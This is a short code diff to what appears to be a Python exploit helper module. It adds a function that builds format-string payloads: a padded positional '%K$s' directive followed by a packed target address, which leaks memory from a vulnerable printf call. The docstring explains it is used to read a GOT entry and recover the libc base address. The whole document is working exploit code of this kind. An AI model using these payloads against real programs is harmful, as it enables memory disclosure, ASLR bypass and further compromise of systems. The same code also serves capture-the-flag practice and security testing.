@@ -88,3 +88,15 @@ def probe_payload(count: int = 20, marker: bytes = b"AAAAAAAA", word: int = 8) -
     marker = marker[:word].ljust(word, b"A")
     body = b" ".join(f"%{i}$p".encode() for i in range(1, count + 1))
     return marker + b"|" + body + b"\n"
+
+
+def read_at_payload(arg_offset: int, addr: int, *, word: int = 8, pad: int = 16) -> bytes:
+    """A format payload that leaks the string at `addr` via a positional `%K$s`. The directive is
+    padded to `pad` (a word multiple) bytes so the address that follows sits at a KNOWN varargs slot
+    -- K = arg_offset + pad/word -- which makes the leak DETERMINISTIC (no %p-dump classification,
+    which needs several corroborating symbol pointers a stack dump rarely has). printf prints the
+    dereferenced string FIRST, so the leaked bytes lead the output. Used to read a GOT slot's
+    resolved libc address and recover the base."""
+    slot = arg_offset + pad // word
+    directive = ("%%%d$s" % slot).encode().ljust(pad, b".")
+    return directive + struct.pack("<Q" if word == 8 else "<I", addr) + b"\n"
